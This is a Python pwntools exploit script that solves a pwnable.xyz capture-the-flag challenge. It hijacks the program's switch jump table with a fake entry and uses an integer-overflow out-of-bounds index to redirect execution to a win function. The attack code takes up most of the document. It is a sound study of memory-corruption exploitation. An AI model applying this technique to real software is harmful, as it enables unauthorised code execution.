###Switch table hijacking
###The switch table of this program has been modified such that the default case does not work at all
###In other words, no matter the value of switch, a lookup will be performed and jmp will be taken
###Thus, if we can craft a fake jmp_table entry and jump to it, flow control is possible

from pwn import *

context.arch='amd64'

###Structure
'''
    |   4   |   4   |   4   |   4   |
0x00|             name              |
0x10|             race              |
0x20|   quest_ptr   |   hp  | level |
0x30|             class             |
0x38|     class     |
'''

###Util
def register(name,race,clas):
    r.sendafter('Name: ',name)
    r.sendafter('Race: ',race)
    r.sendafter('Class: ',clas)

def get_level():
    r.recvuntil('Level: ')
    level = int(r.recvline()[:-1])
    return level

def PvP():
    r.sendlineafter('> ','1')

def PvE(mode='normal',choice=None,payload=None):
    r.sendlineafter('> ','2')
    if mode!='normal':
        r.sendlineafter('quest: ',str(choice))
        if mode=='prepare':
            r.sendafter('Quest: ',payload)
        elif mode=='hijack':
            r.interactive()
        return
    ###Problem solving script is not 100% reliable, but since I'm too lazy to find out why and it works anyway...
    quest = r.recvline()
    r.recvuntil('Quest: ')
    prob = r.recvline()[:-1]
    if len(prob)>4:
        prob = prob[:4]
    prob = u32(prob.ljust(4,b'\x00'))
    if b'Xur' in quest:
        r.sendline(str(prob))
    elif b'Hexer' in quest:
        r.send(str(prob).encode()+b'\x00')
    elif b'mushroom' in quest:
        r.sendline(str(0x100000000-prob))
    elif b'bitport' in quest:
        r.sendline('32')

###Addr
quests = 0x6022a0
inp_buf = 0x6025e0
switch_base = 0x401674
win = 0x400a8c


###Exploit
r = remote('svc.pwnable.xyz',30042)

###Random name for character(the off by one in field class is red herring)
register('M30W','M30W','M30W')

###Pad level to make pve case selectable
while True:
    PvE(mode='normal')
    level = get_level()
    print(level)
    if level>5:
        break

###Prepare fake entry of jump table on s2 buffer
PvE(mode='prepare',choice=1,payload=flat([(inp_buf+8-switch_base)//4,win-switch_base]))

###The quest_ptr will only be assignable when case<=3, this immediately leads to OOB towards lower memory space
###Sadly, the only writeable buf(s2) is at a higher memory space compared to quests buf, and I got stuck for a while
###After some inspection, I realized the idx*0xc4 actually allows OOB into higher memory space with negative value overflow
###However, a single overflow can not align the OOB entry onto s2 buf of size 0x10
###It isn't hard to notice that 1<<64 is not divideable by 0xc4, thus by overflowing several times, I finally nudge the fake entry onto s2 buf
for i in range(0xc4):
    if (inp_buf-((1<<64)*i+quests+0xc0))%0xc4==0:
        entry = (inp_buf-((1<<64)*i+quests+0xc0))//0xc4
        break
PvE(mode='hijack',choice=entry)
